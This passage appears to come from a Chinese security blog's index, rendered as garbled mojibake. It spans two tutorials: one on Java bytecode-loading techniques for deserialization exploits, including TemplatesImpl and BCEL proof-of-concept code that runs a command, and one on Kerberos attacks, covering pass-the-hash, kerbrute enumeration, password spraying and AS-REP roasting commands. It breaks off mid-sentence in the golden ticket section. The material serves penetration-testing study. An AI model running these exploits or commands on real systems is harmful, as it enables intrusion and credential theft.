//rceå‘½ä»¤å¼¹å‡ºè®¡ç®—å™¨ String cmd = &quot;calc&quot;; // é€šè¿‡URLClassLoaderåŠ è½½.classä¸­çš„Testç±» Class aClass = urlClassLoader.loadClass(&quot;Test&quot;); // invokeè°ƒç”¨Testç±»ä¸­çš„rceæ–¹æ³• aClass.getMethod(&quot;rce&quot;, String.class).invoke(null, cmd); }} (4)defineClassæ–¹æ³•åŠ è½½å­—èŠ‚ç  â˜…defineClassæ˜¯ä¸€ä¸ªprotectedç±»å‹,æ‰€ä»¥åªèƒ½é€šè¿‡åå°„è°ƒç”¨,å­—èŠ‚ç ä»»æ„åŠ è½½ç±» æ„é€ æ¶æ„ç±»:Hello.java 123456789101112import java.io.IOException;public class Hello { static { try { Runtime.getRuntime().exec(&quot;calc&quot;); } catch (IOException e) { throw new RuntimeException(e); } }} javac Hello.java ç”Ÿæˆ.classå­—èŠ‚æ–‡ä»¶ åˆ©ç”¨ClassLoaderç±»çš„ defineClassæ–¹æ³• è‡ªå®šä¹‰è¯»å–Hello.classï¼Œæ„å»ºæ¶æ„Helloç±»: 123456789101112131415161718192021222324252627import java.io.IOException;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;public class defineClass_loadclass { public static void main(String[] args) throws IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, InstantiationException { ClassLoader cl = ClassLoader.getSystemClassLoader(); //é€šè¿‡ç±»åŠ è½½å™¨çš„ Classå¯¹è±¡ åå°„è°ƒç”¨getDeclaredMethod()æ–¹æ³•ï¼Œè·å–ç±»åŠ è½½å™¨Classå¯¹è±¡é‡Œçš„ defineClassæ–¹æ³• è‡ªå®šä¹‰æ¶æ„ç±» Method defineClassMethod = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;,String.class, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\Java-IDEA\\\\java_workspace\\\\zhujie\\\\src\\\\load_class\\\\Hello.class&quot;)); Class c = (Class) defineClassMethod.invoke(cl,&quot;Hello&quot;,code,0,code.length); /*å®é™…ä¸Š æ–¹æ³•.invokeæ¿€æ´»ï¼Œè¿”å›çš„ç±»å‹æ˜¯æ ¹æ®è¿™ä¸ªæ–¹æ³•è¿”å›å€¼å†³å®šçš„ã€‚åˆå› ä¸ºdefineClassæ–¹æ³•å¯ä»¥è¿”å›Classå¯¹è±¡ï¼Œ * å› æ¬¡è¿™é‡Œå¯ä»¥é€šè¿‡å¼ºåˆ¶ç±»å‹è½¬åŒ– æ‹¿åˆ°ä¸€ä¸ªä».classé‡Œå¾—åˆ°çš„æ¶æ„Helloç±» ç„¶åé€šè¿‡Class c = (Class)èµ‹å€¼ç»™c * å¤§å¤šæ•°æ–¹æ³•æ˜¯voidç±»å‹çš„ï¼Œè¿”å›null å› æ­¤ æ–¹æ³•.invokeé»˜è®¤ä¼šæ˜¯objectç±»å‹(æµ‹è¯• nullå¥½åƒæ˜¯object) * */ System.out.println(c); c.newInstance(); }} å¼¹å‡ºæ¥äº†è®¡ç®—å™¨ åœ¨å®é™…åœºæ™¯ä¸­ï¼Œå› ä¸º defineClass æ–¹æ³•ä½œç”¨åŸŸæ˜¯ä¸å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¾ˆå°‘èƒ½ç›´æ¥åˆ©ç”¨åˆ°å®ƒï¼Œä½†å®ƒå´æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ä¸€ä¸ªæ”»å‡»é“¾ TemplatesImpl çš„åŸºçŸ³ã€‚åœ¨åé¢ CC3ä¸­å°†ä¼šå­¦åˆ° (5)Unsafeç±» åŠ è½½å­—èŠ‚ç 1234567891011121314151617181920212223242526package load_class;import sun.misc.Unsafe;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;import java.security.ProtectionDomain;public class unsafe_defineclass { public static void main(String[] args) throws InstantiationException, IllegalAccessException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException { ClassLoader classLoader = ClassLoader.getSystemClassLoader(); Class&lt;Unsafe&gt; unsafeClass = Unsafe.class; Field unsafeField = unsafeClass.getDeclaredField(&quot;theUnsafe&quot;); unsafeField.setAccessible(true); Unsafe classUnsafe = (Unsafe) unsafeField.get(null); Method defineClassMethod = unsafeClass.getMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class); byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\Java-IDEA\\\\java_workspace\\\\zhujie\\\\src\\\\load_class\\\\Hello.class&quot;)); Class calc = (Class) defineClassMethod.invoke(classUnsafe, &quot;Hello&quot;, code, 0, code.length, classLoader, null); calc.newInstance(); }} (6)TemplatesImpl åŠ è½½å­—èŠ‚ç  â˜…TemplatesImplç±»ä¸­å¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªå†…éƒ¨ç±» TransletClassLoaderï¼Œè¿™ä¸ªç±»æ˜¯ç»§æ‰¿ ClassLoaderï¼Œå¹¶ä¸”é‡å†™äº† defineClass æ–¹æ³• ç®€å•æ¥è¯´ï¼Œè¿™é‡Œçš„ defineClass ç”±å…¶çˆ¶ç±»çš„ protected ç±»å‹å˜æˆäº†ä¸€ä¸ª default ç±»å‹çš„æ–¹æ³•ï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨ã€‚ è°ƒç”¨é“¾ä¸ºï¼š 1234567/*TemplatesImpl#getOutputProperties() TemplatesImpl#newTransformer() TemplatesImpl#getTransletInstance() TemplatesImpl#defineTransletClasses() TransletClassLoader#defineClass()*/ æˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ªæ¶æ„çš„ æ‰§è¡Œä»£ç çš„ç±» å› ä¸ºé“¾å­é‡Œæƒ³èµ°é€šï¼Œéœ€è¦æ»¡è¶³è¿™ä¸ªç±»éœ€è¦ç»§æ‰¿ AbstractTranslet æ‰€ä»¥éœ€è¦é‡å†™ AbstractTransletçš„æ–¹æ³• ä¸ºä»€ä¹ˆéœ€è¦ç»§æ‰¿ï¼Œåé¢CCé“¾é‡Œä¼šè¯¦ç»†åˆ†æ 1234567891011121314151617181920212223242526import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class templatesImpl_evil extends AbstractTranslet { @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } static { try { Runtime.getRuntime().exec(&quot;calc&quot;); } catch (IOException e) { throw new RuntimeException(e); } }} pocå¦‚ä¸‹ï¼š 12345678910111213141516171819202122import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class TemplateRce { public static void main(String[] args) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\\\Users\\\\lenovo\\\\Desktop\\\\templatesImpl_evil.class&quot;)); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_name&quot;, &quot;Calc&quot;); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {code}); setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); templates.newTransformer(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); ((Field) field).set(obj, value); }} (7)BCEL ClassLoader åŠ è½½å­—èŠ‚ç BCEL çš„å…¨ååº”è¯¥æ˜¯ Apache Commons BCELï¼Œå±äºApache Commonsé¡¹ç›®ä¸‹çš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œä½†å…¶å› ä¸ºè¢« Apache Xalan æ‰€ä½¿ç”¨ï¼Œè€Œ Apache Xalan åˆæ˜¯ Java å†…éƒ¨å¯¹äº JAXP çš„å®ç°ï¼Œæ‰€ä»¥ BCEL ä¹Ÿè¢«åŒ…å«åœ¨äº† JDK çš„åŸç”Ÿåº“ä¸­ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ BCEL æä¾›çš„ä¸¤ä¸ªç±» Repository å’Œ Utility æ¥åˆ©ç”¨ï¼š Repository ç”¨äºå°†ä¸€ä¸ªJava Class å…ˆè½¬æ¢æˆåŸç”Ÿå­—èŠ‚ç ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨javacå‘½ä»¤æ¥ç¼–è¯‘java æ–‡ä»¶ç”Ÿæˆå­—èŠ‚ç  Utility ç”¨äºå°†åŸç”Ÿçš„å­—èŠ‚ç è½¬æ¢æˆBCELæ ¼å¼çš„å­—èŠ‚ç ï¼š 12345678910111213141516package org.example;import com.sun.org.apache.bcel.internal.Repository;import com.sun.org.apache.bcel.internal.classfile.JavaClass;import com.sun.org.apache.bcel.internal.classfile.Utility;import java.io.IOException;public class BCELClassLoaderRCE { public static void main(String[] args) throws ClassNotFoundException, IOException { Class&lt;?&gt; cls = Class.forName(&quot;org.example.evil&quot;); JavaClass javaClass = Repository.lookupClass(cls); String code = Utility.encode(javaClass.getBytes(), true); System.out.println(code); }} è¿™ä¸€å †ç‰¹æ®Šçš„ä»£ç ï¼ŒBCEL ClassLoader æ­£æ˜¯ç”¨äºåŠ è½½è¿™ä¸²ç‰¹æ®Šçš„â€œå­—èŠ‚ç â€ï¼Œå¹¶å¯ä»¥æ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹ POCæ³¨ï¼šè¿™é‡ŒClassLoaderåŒ…ä¸è¦å¯¼å…¥é”™äº† åº”ä¸º com.sun.org.apache.bcel.internal.util.ClassLoader 123456789101112131415161718package org.example;import com.sun.org.apache.bcel.internal.util.ClassLoader;import java.io.IOException;public class BCELClassLoaderRCE { public static void main(String[] args) throws ClassNotFoundException, IOException, InstantiationException, IllegalAccessException { Class&lt;?&gt; cls = new ClassLoader().loadClass(&quot;$$BCEL$$&quot; + &quot;$l$8b$I$A$A$A$A$A$A$AmQMo$da$40$Q$7d$L$Ecc$C$n$F$f2$d1$7c$d06$J$f4P$lz$E$f5R5R$U$t$a9BD$d5$e3$b2$dd$9aM$8d$8d$8c$a1$fc$a3$9e$b9$b4U$x5$f7$fc$a8$aa$b3$$$o$u$89$r$cf$ec$bc$f7$e6$cdx$7d$fb$f7$d7$l$A$af$d1$b0$60b$c3$c2$s$b6r$d8$d6$f9$a9$81$j$D$bb$W$b2$d83$b0o$a0$ce$90m$ab$40$c5o$Y$d2$8df$97$n$f36$fc$q$Z$8a$ae$K$e4$f9x$d0$93$d1$V$ef$f9$84$94$ddPp$bf$cb$p$a5$eb9$98$89$fbj$94p$91$e7$c8$v$l$M$7d$e9$c8$89$f2$5b$M$b9$b6$f0$e7$d6$8c$a4$V$f7$9aO$b8$a3B$e7$e4$e2$ddT$c8a$ac$c2$80d$85N$cc$c5$973$3eL$yiA$G$ab$T$8e$p$n$8f$95$kaj$bbW$ba$d7$86$85$bc$81g6$9e$e3$F$cd$a6u$84$8d$D$i2$ac$3f$e2$cd$b0$95$a0$3e$P$3c$e7r$i$c4j$m$X$a4$f6$3ab$u$dd$df$9b$a0$bb$a6$8b$de$b5$U1$c3$da$D$l$da$d1$93$f1$a2$a84$9a$ee$D$N$7d$5bFN$a5$608j$y$b1$9d8R$81$d7Znx$l$85B$8eF$d4$b0$b1$ac$bc$eaG$e1W$7d$v$adf$Xu$e4$e8o$ea$t$F$a6$_$82$a2M$95C$99Q$5ey$f9$Dl$96$d0$F$8a$d9$ff$mV$v$da$f3s$R$r$ca9$ac$z$9a$3f$p$9dp$b5$9fH$95$d3$df$91$f9$f0$N$85$d3$df$c8$7e$q7$e3f$96$90$sIWH$a8m$abtB$b2I$9eP$930$8b0$7b1$a6$40X$Z$ebT$3d$a1$d7$40$ca5P1$89$a8$s$9b$d5$fe$By$9aqE$9c$C$A$A&quot;); cls.newInstance(); /* Class&lt;?&gt; cls = Class.forName(&quot;org.example.evil&quot;); JavaClass javaClass = Repository.lookupClass(cls); String code = Utility.encode(javaClass.getBytes(), true); System.out.println(code); */ }} é‚£ä¹ˆä¸ºä»€ä¹ˆè¦åœ¨å‰é¢åŠ ä¸Š $$BCEL$$ å‘¢ BCEL è¿™ä¸ªåŒ…ä¸­æœ‰ä¸ªæœ‰è¶£çš„ç±»com.sun.org.apache.bcel.internal.util.ClassLoaderï¼Œä»–æ˜¯ä¸€ä¸ª ClassLoaderï¼Œä½†æ˜¯ä»–é‡å†™äº† Java å†…ç½®çš„ClassLoader#loadClass()æ–¹æ³•ã€‚ åœ¨ ClassLoader#loadClass() ä¸­ï¼Œå…¶ä¼šåˆ¤æ–­ç±»åæ˜¯å¦æ˜¯ $$BCEL$$ å¼€å¤´ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°†ä¼šå¯¹è¿™ä¸ªå­—ç¬¦ä¸²è¿›è¡Œ decode è¿™ä¹ˆå¤šç§å§¿åŠ¿ï¼Œå®é™…ä¸Šéƒ½æ˜¯ä¸ºäº†å»åŠ è½½é‚£ä¸ª .classæ–‡ä»¶ ä¹Ÿå°±æ˜¯å­—èŠ‚ç æ–‡ä»¶ ä»è€Œåˆ©ç”¨ã€‚ å‚è€ƒï¼šhttps://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/#7-%E5%88%A9%E7%94%A8-BCEL-ClassLoader-%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81","link":"/2023/06/06/Java%E5%9F%BA%E7%A1%80%E7%AF%87-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"},{"title":"Kerberosåè®®æ¼æ´æ”»å‡»","text":"ä¸Šæ–‡è¯¦ç»†ä»‹ç»äº† Kerberosåè®®å†…å®¹ã€è®¤è¯è¿‡ç¨‹ã€æ•°æ®åŒ…åˆ†æä»¥åŠå­˜åœ¨çš„å®‰å…¨é—®é¢˜ï¼Œæœ¬æ–‡è¯¦ç»†æ¼”ç¤ºä¸€ä¸‹ Kerberosè®¤è¯è¿‡ç¨‹ä¸­ï¼ŒAS_REQã€AS_REPã€TGS_REPé˜¶æ®µçš„å„ç§æ”»å‡»æ–¹å¼ã€‚ä»¥åŠä¸€äº›å·¥å…·ä½¿ç”¨ ä¾‹å¦‚ï¼škerbruteã€pyKerbrute AS_REQ&amp;ASREPé˜¶æ®µæ”»å‡»(1) PTH å“ˆå¸Œä¼ é€’æ”»å‡»åœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦æŠ“å–ç®¡ç†å‘˜å¯†ç ã€NTLM Hashé€šè¿‡æœé›†è¿™äº›ä¿¡æ¯æœ‰åŠ©äºæˆ‘ä»¬æ‰©å¤§æˆ˜æœã€å°¤å…¶æ˜¯åœ¨åŸŸç¯å¢ƒä¸‹ã€‚ ä»€ä¹ˆæ˜¯å“ˆå¸Œä¼ é€’ï¼Ÿ å“ˆå¸Œä¼ é€’æ˜¯èƒ½å¤Ÿåœ¨ä¸éœ€è¦è´¦å·æ˜æ–‡å¯†ç çš„æƒ…å†µä¸‹å®Œæˆè®¤è¯çš„ä¸€ä¸ªæŠ€æœ¯ã€‚ æ¯”å¦‚NTLM Hashã€LM Hashéƒ½ä¸éœ€è¦æ˜æ–‡å¯†ç å› æ­¤éƒ½å¯ä»¥è¢«ç§°ä¸ºHashä¼ é€’æ”»å‡»ã€‚ å“ˆå¸Œä¼ é€’çš„ä½œç”¨ è§£å†³æ¸—é€ä¸­è·å–ä¸åˆ°æ˜æ–‡å¯†ç ï¼Œç ´è§£ä¸äº†NTLM Hashçš„MD4ç®—æ³•è€Œåˆæƒ³æ‰©å¤§æˆ˜æœçš„é—®é¢˜ã€‚ Pass The Hash å¿…è¦æ¡ä»¶ å“ˆå¸Œä¼ é€’éœ€è¦è¢«è®¤è¯çš„ä¸»æœºèƒ½å¤Ÿè®¿é—®æœåŠ¡å™¨ å“ˆå¸Œä¼ é€’éœ€è¦è¢«ä¼ é€’è®¤è¯çš„ç”¨æˆ·å å“ˆå¸Œä¼ é€’éœ€è¦ä¼ é€’çš„è®¤è¯ç”¨æˆ·çš„NTLM Hash åœ¨AS-REQé˜¶æ®µï¼Œæ•°æ®åŒ…ä¸­åŠ å¯†çš„Authenticatorå­—æ®µæ˜¯ç”¨ç”¨æˆ·å¯†ç Hashè¿›è¡ŒåŠ å¯†çš„ï¼Œæ‰€ä»¥ä¹Ÿå¯è¿›è¡Œhashä¼ é€’ msfçš„ exploit/windows/smb/psexecæ¨¡å— æ”»å‡» ç”¨æˆ·åï¼šadministrator LM\\NTLM Hashï¼šaad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab mimikatz è¿›è¡ŒPTHæ”»å‡» 1sekurlsa::pth /user:administrator /domain:192.168.16.20 /ntlm:570a9a65db8fba761c1008a51d4c95ab (2) åŸŸå†…ç”¨æˆ·æšä¸¾åŸŸå†…ç”¨æˆ·æšä¸¾ï¼Œå³çˆ†ç ´ä¸€ä¸‹åŸŸå†…çš„è´¦æˆ·å æ³¨ï¼šKerberos pre-authå¯¹åº”çš„ç«¯å£é»˜è®¤ä¸º88 DCè¦å¼€å¯kerberos 88ç«¯å£ ç”¨åˆ°äº† kerbruteå·¥å…·ï¼Œä¸‹è½½åœ°å€ï¼šhttps://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe è¿™é‡Œéœ€è¦æˆ‘ä»¬æå‰å‡†å¤‡å¥½ä¸€ä¸ª ç”¨æˆ·å­—å…¸ 123456adminblack1vxyzlucymiketest 1kerbrute_windows_amd64.exe userenum --dc 192.168.16.10 -d hack.com user.txt å¯çŸ¥ï¼š1vxyzç”¨æˆ·æ˜¯å­˜åœ¨çš„ kerbruteè¿›è¡Œé”™è¯¯æšä¸¾çš„åŸç†å°±æ˜¯kerberosæœ‰è¿™æ ·å››ç§é”™è¯¯ä»£ç ï¼š KDC_ERR_PREAUTH_REQUIRED-éœ€è¦é¢å¤–çš„é¢„è®¤è¯ï¼ˆå¯ç”¨ï¼‰ KDC_ERR_CLIENT_REVOKED-å®¢æˆ·ç«¯å‡­è¯å·²è¢«åŠé”€ï¼ˆç¦ç”¨ï¼‰ KDC_ERR_C_PRINCIPAL_UNKNOWN-åœ¨Kerberosæ•°æ®åº“ä¸­æ‰¾ä¸åˆ°å®¢æˆ·ç«¯ï¼ˆä¸å­˜åœ¨ï¼‰ KDC_ERR_PREAUTH_FAILED (ç”¨æˆ·å­˜åœ¨ä½†å¯†ç é”™è¯¯) æŠ“åŒ…åˆ†æï¼Œæ ¹æ®æŠ¥é”™å¯ä»¥çœ‹å‡ºæ¥æœ‰4ä¸ªUNKNOWNï¼Œ1ä¸ªREQUIRED é‚£ä¸ªREQUIREDçš„ å³ä¸ºçœŸæ­£å­˜åœ¨çš„ç”¨æˆ· æ³¨ï¼šå¦‚æœæŸä¸ªç”¨æˆ·å‹¾é€‰äº† Kerberosé¢„èº«ä»½éªŒè¯ï¼Œåˆ™åˆ¤æ–­ä¸å‡ºæ¥ï¼Œè¿™ä¸ªåœ¨åé¢AS-REP roastingæ”»å‡»ä¼šè®²åˆ° (3) å¯†ç å–·æ´’æ”»å‡»(ç”¨æˆ·å¯†ç æšä¸¾)å¯†ç å–·æ´’ï¼Œå³æˆ‘ä»¬å·²çŸ¥ä¸€äº›åŸŸå†…çš„ç”¨æˆ·åï¼Œåœ¨AS-REQé˜¶æ®µï¼ŒASä¼šæ ¹æ®è¯·æ±‚åŒ…ä¸­å¯†ç æ­£ç¡®ä¸é”™è¯¯çš„è¿”å›åŒ…çš„ä¸åŒï¼Œçˆ†ç ´ç”¨æˆ·å¯†ç çš„ä¸€ç§æ”»å‡»æ–¹å¼ kerbruteè¿›è¡Œå¯†ç å–·æ´’12kerbrute_windows_amd64.exe passwordspray --dc 192.168.16.10 -d hack.com user.txt 1qaz@WSX # é€‚ç”¨äºå­˜åœ¨ç”¨æˆ·è´¦æˆ·é”å®šç­–ç•¥kerbrute_windows_amd64.exe bruteuser --dc 192.168.16.10 -d hack.com password.txt administrator åŸç† åŒåŸŸå†…ç”¨æˆ·æšä¸¾ è¿™ä¸ªå·¥å…· æœ‰ä¸€ä¸ªä»¥ç”¨æˆ·åå½“æˆå¯†ç è¿›è¡Œçˆ†ç ´çš„é€‰é¡¹ï¼Œç„¶åå°±æ˜¯å•ä¸ªæ˜æ–‡å¯†ç  ä¸èƒ½é€šè¿‡ntlm hash pyKerbruteå·¥å…·è¿›è¡Œå¯†ç å–·æ´’pyKeybruteæ˜¯ä¸€æ¬¾ä½¿ç”¨Pythonç¼–å†™çš„åŸŸå†…ç”¨æˆ·æšä¸¾å’Œå¯†ç å–·æ´’å·¥å…·,å¯ä»¥é€šè¿‡UDPå’ŒTCPä¸¤ç§æ¨¡å¼è¿›è¡Œå·¥ä½œã€‚å¯†ç å–·æ´’å¯ä»¥ä½¿ç”¨æ˜æ–‡å¯†ç æˆ–å¯†ç hash ä¸‹è½½åœ°å€:https://github.com/3gstudent/pyKerbrute ç”¨æ³•ï¼š 1234python2 ADPwdSpray.py 192.168.16.10 hack.com user.txt clearpassword Admin@123 tcppython2 ADPwdSpray.py 192.168.16.10 hack.com user.txt clearpassword Admin@123 udppython2 ADPwdSpray.py 192.168.16.10 hack.com user.txt ntlmhash 570a9a65db8fba761c1008a51d4c95ab tcppython2 ADPwdSpray.py 192.168.16.10 hack.com user.txt ntlmhash 570a9a65db8fba761c1008a51d4c95ab tcp æ³¨ï¼šå¦‚æœä¸‹è½½ä¸‹æ¥æŠ¥é”™ æŠŠæ–‡ä»¶é‡Œçš„from Crypto.Cipher import MD4,MD5 æ”¹ä¸ºfrom Crypto.Hash import MD4,MD5 ä¹Ÿå¯ä»¥é€šè¿‡ kaliå†…ç½®çš„ä¸€äº›å·¥å…·ï¼Œæ¯”å¦‚ï¼šCrackMapExecã€hydraç­‰ç­‰è¿›è¡Œçˆ†ç ´ï¼Œä»–ä»¬ä¸»è¦é’ˆå¯¹smbåè®® ä¸¥æ ¼æ¥è¯´ä¸ç®—å¯†ç å–·æ´’ æœ‰hashç¢°æ’çš„æ„æ€ (4) AS-REP Roastingæ”»å‡»Roastingæ”»å‡»ç®€ä»‹AS-REP Roastingæ”»å‡»æ˜¯ä¸€ç§å¯¹ç”¨æˆ·è´¦å·è¿›è¡Œç¦»çº¿çˆ†ç ´çš„æ”»å‡»æ–¹å¼ï¼Œæ˜¯ç®¡ç†å‘˜çš„é”™è¯¯é…ç½®å¯¼è‡´çš„ã€‚ç®¡ç†å‘˜åœ¨DCä¸Š ç”¨æˆ·è´¦æˆ·ç­–ç•¥å‹¾é€‰äº† ä¸è¦æ±‚Kerberosé¢„èº«ä»½éªŒè¯ AS_REP Roastingæ”»å‡»çš„é¦–è¦æ¡ä»¶ï¼š å‹¾é€‰äº†é»˜è®¤ä¸éœ€è¦Kerberosé¢„èº«ä»½éªŒè¯ ä»€ä¹ˆå«é¢„èº«ä»½è®¤è¯å‘¢ï¼Ÿ æˆ‘ä»¬æ²¡æœ‰å‹¾é€‰çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡kekeoç”³è¯·ç¥¨æ®ï¼Œè¿™é‡Œæˆ‘ä»¬è¾“å…¥æ­£ç¡®çš„è´¦å·å¯†ç æ‰æœ‰ AS-REPæ•°æ® æ‰“ä¸Šå‹¾ä¹‹åï¼Œåœ¨AS-REQé˜¶æ®µï¼Œåªéœ€è¦å‘ä¸ªç”¨æˆ·åå³å¯ä¸éœ€è¦å‘é€å¯†ç  ä¹Ÿä¼šæœ‰AS-REPæ•°æ® åœ¨AS-REPé˜¶æ®µï¼Œæ•°æ®åŒ…ä¸­æœ€å¤–å±‚çš„enc-partæ˜¯ç”¨æˆ·å¯†ç hashåŠ å¯†çš„ åŸç†ï¼š ä¸éœ€è¦Kerberosçš„åŸŸèº«ä»½è®¤è¯ï¼ŒAS_REPè¿‡ç¨‹ä¸­å¯ä»»æ„ä¼ªé€ ç”¨æˆ·åè¯·æ±‚ç¥¨æ®ã€‚é€šè¿‡çˆ†ç ´ enc-partå¾—åˆ°è·å¾—ç”¨æˆ·hashï¼Œæ‹¼æ¥æˆâ€Kerberos 5 AS-REP etype 23â€(18200)çš„æ ¼å¼ï¼Œæ¥ä¸‹æ¥å¯ä»¥é€šè¿‡hashcatå¯¹å…¶ç ´è§£ï¼Œæœ€ç»ˆè·å¾—æ˜æ–‡å¯†ç ï¼Œæ„æˆäº† AS-REP Roastingæ”»å‡» ä¸»è¦æ”»å‡»æ‰‹æ®µè¿˜æ˜¯é»„é‡‘ç¥¨æ®æ”»å‡» è·å–å‹¾é€‰ä¸éœ€è¦é¢„è®¤è¯ç”¨æˆ·åˆ—è¡¨ä½¿ç”¨Empireä¸‹çš„ powerview.ps1 æŸ¥æ‰¾åŸŸä¸­è®¾ç½®äº†â€ä¸éœ€è¦kerberosé¢„è®¤è¯â€çš„ç”¨æˆ· è¿™ä¸ªæ˜¯é’ˆå¯¹åŸŸç”¨æˆ·å¯ç”¨çš„è„šæœ¬ï¼Œå› ä¸ºè¿™ä¸ªè„šæœ¬æ˜¯é‡‡ç”¨ldapåè®®å‘åŸŸæ§å»æŸ¥ 123Import-Module .\\powerview.ps1Get-DomainUser -PreauthNotRequiredGet-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose è·å–AS-REPçš„enc-partå¯¹åŸŸå†…çš„ä¸»æœºï¼Œå¦‚æœæƒ³çŸ¥é“æŸç”¨æˆ·çš„hashåŠ å¯†çš„enc-partå€¼ï¼Œå¯ä»¥ä½¿ç”¨ç›¸å…³å·¥å…·ï¼Œé€šè¿‡ LDAPåè®®æŸ¥è¯¢ç”¨æˆ·ï¼Œåˆ—å‡ºç›¸å…³çš„partå€¼ Rubeuså·¥å…·æ˜¯Harmj0y ç”¨C#å¼€å‘çš„é’ˆå¯¹Kerberosåè®®è¿›è¡Œæ”»å‡»çš„å·¥å…·ã€‚å®ƒå¯ä»¥å‘èµ·Kerberosè¯·æ±‚ï¼Œæ¯”å¦‚TGTè¯·æ±‚ã€STè¯·æ±‚ï¼Œä¹Ÿå¯ç”¨äº AS-REP Roastingæ”»å‡»ã€Kerberosastingæ”»å‡»ã€å§”æ´¾æ”»å‡»ã€é»„é‡‘ç¥¨æ®ã€ç™½é“¶ç¥¨æ®ç­‰ç­‰ Rubeuså·¥å…·éœ€è¦ .NET frameworkç¯å¢ƒæ”¯æŒ ç”¨æ³•ï¼š 1Rubeus.exe ASREPRoast.ps1è·å–AS-REPè¿”å›çš„hash 12Import-Module .\\ASREPRoast.ps1Get-ASREPHash -Username lisi -Domain hack.com | Out-File Encoding ASCII hash.txt (5) é»„é‡‘ç¥¨æ®é»„é‡‘ç¥¨æ®ä»‹ç»åœ¨ AS-REP é˜¶æ®µï¼ŒASæˆåŠŸè®¤è¯Client çš„èº«ä»½ä¹‹åï¼Œä¼šå‘é€å“åº”åŒ…ç»™å®¢æˆ·ç«¯ã€‚å…¶ä¸­ä¸»è¦åŒ…æ‹¬ï¼š krbtgtç”¨æˆ·çš„NTLM HashåŠ å¯†åçš„TGTè®¤è´­æƒè¯(å³ticketè¿™éƒ¨åˆ†) ç”¨æˆ·NTLM HashåŠ å¯†çš„AS Session key(å³æ•°æ®åŒ…ä¸­æœ€å¤–å±‚ enc-part éƒ¨åˆ†) ä»¥åŠä¸€äº›å…¶ä»–ä¿¡æ¯ã€‚AS Session Keyçš„ä½œç”¨æ˜¯ç”¨äºç¡®ä¿å®¢æˆ·ç«¯å’ŒKDCä¸‹é˜¶æ®µä¹‹é—´é€šä¿¡å®‰å…¨ã€‚æœ€åTGTè®¤è´­æƒè¯ã€åŠ å¯†çš„Lgoin Session Keyã€æ—¶é—´æˆ³ å’Œ PAC ç­‰ä¿¡æ¯ä¼šå‘é€ç»™å®¢æˆ·ç«¯ å› æ­¤ AS-REPä¸­æœ€æ ¸å¿ƒçš„ä¸œè¥¿å°±æ˜¯ AS session-key å’Œ krbtgtç”¨æˆ·çš„NTLM HashåŠ å¯†çš„ticket é»„é‡‘ç¥¨æ®çš„åŸç†ï¼š ç”±äºè¿”å›çš„ TGT è®¤è´­æƒè¯æ˜¯ç”± krbtgt ç”¨æˆ·çš„å¯†ç HashåŠ å¯†çš„ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬æ‹¥æœ‰ krbtgt çš„ hash å°±å¯ä»¥è‡ªå·±åˆ¶ä½œä¸€ä¸ªTGTè®¤è´­æƒè¯ï¼Œè¿™å°±é€ æˆäº†é»„é‡‘ç¥¨æ®æ”»å‡» é»„é‡‘ç¥¨æ®çš„å¿…è¦æ¡ä»¶ å·²çŸ¥è¦ä¼ªé€ çš„åŸŸç”¨æˆ·(ä¸€èˆ¬å†™åŸŸç®¡ç†å‘˜ç”¨æˆ·) åŸŸå 